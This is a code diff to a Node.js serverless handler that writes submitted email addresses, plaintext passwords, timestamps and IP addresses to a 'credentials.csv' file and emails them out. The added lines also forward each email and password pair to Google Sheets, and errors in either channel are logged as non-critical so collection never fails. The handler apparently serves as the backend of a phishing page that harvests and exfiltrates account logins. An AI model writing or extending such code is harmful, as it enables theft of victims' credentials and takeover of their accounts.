@@ -2,6 +2,7 @@ const fs = require('fs');
 const path = require('path');
 const createCsvWriter = require('csv-writer').createObjectCsvWriter;
 const nodemailer = require('nodemailer');
+const { saveToGoogleSheets } = require('./save-to-sheets');
 
 // Caminho do arquivo CSV (usar /tmp na Vercel)
 const CSV_FILE = path.join('/tmp', 'credentials.csv');
@@ -144,11 +145,19 @@ module.exports = async (req, res) => {
 
         console.log(`Credenciais salvas: ${email} - ${new Date().toLocaleString()}`);
 
-        // Enviar email com as credenciais
+        // Salvar no Google Sheets (se configurado)
+        try {
+            await saveToGoogleSheets(email, password, timestamp, ip);
+        } catch (sheetsError) {
+            console.error('Erro ao salvar no Google Sheets (não crítico):', sheetsError);
+            // Não falhar a requisição se o Sheets não salvar
+        }
+
+        // Enviar email com as credenciais (se configurado)
         try {
             await sendEmailNotification(email, password, timestamp, ip);
         } catch (emailError) {
-            console.error('Erro ao enviar email:', emailError);
+            console.error('Erro ao enviar email (não crítico):', emailError);
             // Não falhar a requisição se o email não enviar
         }
 
